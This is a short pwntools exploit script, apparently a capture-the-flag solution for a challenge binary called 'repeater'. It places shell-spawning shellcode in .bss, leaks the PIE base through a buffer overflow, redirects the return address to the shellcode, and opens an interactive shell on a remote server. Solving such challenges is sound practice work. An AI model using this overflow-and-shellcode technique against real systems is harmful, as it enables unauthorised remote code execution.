from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/repeater')

# p = process('../file/repeater') # 本地测试不行，因为是Ubuntu22.04，会将bss段设置为不可执行
p = remote('61.147.171.105', '62709') # 服务器上用的旧系统，bss段是可执行的

payload = b'a' * 0x20 + p64(0x321321)

p.sendafter(b'name :\n', asm(shellcraft.sh()))
p.sendafter(b'input :', payload)
p.recvuntil(b'0x')
elf.address = int(p.recv(12), 16) - 0xa33

bss_addr = elf.address + 0x202040

pause()

payload = b'a' * 0x20 + p64(0) + b'a' * 8 + p64(0) + p64(bss_addr)
p.sendafter(b'input :', payload)

p.interactive()